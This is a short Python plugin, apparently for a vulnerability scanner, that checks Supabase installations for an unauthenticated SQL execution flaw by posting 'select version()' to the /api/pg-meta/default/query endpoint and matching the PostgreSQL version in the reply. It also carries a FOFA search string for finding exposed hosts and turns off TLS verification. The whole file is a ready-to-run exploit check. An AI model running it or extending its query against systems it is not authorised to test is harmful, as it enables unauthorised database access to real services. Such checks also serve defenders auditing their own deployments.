#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/va50junRYJUidR-5RKG0ng',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'Supabase 后端服务平台 SQL注入',

      'level'     :   'critical',

      'FOFA'      :   'title="Supabase"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/1/16',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': 'application/json',
      }
  target = '/api/pg-meta/default/query'
  data = '{"query":"select version()"}'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=10,verify=False)
    if res.status_code == 200 and re.search(r'version.*?PostgreSQL.*?Debian.*?bit',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret